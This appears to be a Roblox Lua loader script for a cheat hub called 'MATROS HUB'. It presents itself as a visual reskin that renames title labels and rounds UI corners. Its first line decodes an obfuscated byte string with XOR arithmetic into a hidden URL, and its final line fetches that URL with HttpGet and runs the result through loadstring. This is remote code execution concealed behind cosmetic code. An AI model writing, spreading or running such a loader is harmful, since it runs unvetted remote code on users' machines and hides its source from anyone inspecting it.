
--[[ STAGE 2: VISUAL CORE ]]
local EVEkOImeiE3wA="\144\133\134\155\135\079\069\070\128\146\141\143\153\159\135\141\078\132\137\136\075\247\135\254\183\142\144\174\157\155\169\249\156"local JRQIywu4Ugtl=52 local mL0Sh1uFTgcfCA804iTo=34 local zAyMTDKDhUHB7qo=1 local ETn7L1HOlYRRJ=1 local AV1MPYERLwjXCMEgQsNWxN=25 local mIDUesiNWPFZp0vz=false local eTE_GgyyLVUmM=bit32 and bit32.bxor if not eTE_GgyyLVUmM then eTE_GgyyLVUmM=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local d_aXKW0BRlgEVbrGdH={}for cIRNuKQAIBNWK=1,#EVEkOImeiE3wA do local UAw8S_zTfu86=string.byte(EVEkOImeiE3wA,cIRNuKQAIBNWK)local alNB4sicEm5OIty=(mL0Sh1uFTgcfCA804iTo+(cIRNuKQAIBNWK*ETn7L1HOlYRRJ)+AV1MPYERLwjXCMEgQsNWxN)%256 if zAyMTDKDhUHB7qo==0 then UAw8S_zTfu86=(UAw8S_zTfu86-alNB4sicEm5OIty)%256 d_aXKW0BRlgEVbrGdH[cIRNuKQAIBNWK]=string.char(eTE_GgyyLVUmM(UAw8S_zTfu86,JRQIywu4Ugtl))else UAw8S_zTfu86=eTE_GgyyLVUmM(UAw8S_zTfu86,JRQIywu4Ugtl)d_aXKW0BRlgEVbrGdH[cIRNuKQAIBNWK]=string.char((UAw8S_zTfu86-alNB4sicEm5OIty)%256)end end local pYvk9fjIVJrOFo=table.concat(d_aXKW0BRlgEVbrGdH)if mIDUesiNWPFZp0vz then pYvk9fjIVJrOFo=string.reverse(pYvk9fjIVJrOFo)end local P25CDayIjm4IAX0O4oLg=pYvk9fjIVJrOFo
local HubName = "MATROS HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(P25CDayIjm4IAX0O4oLg))()
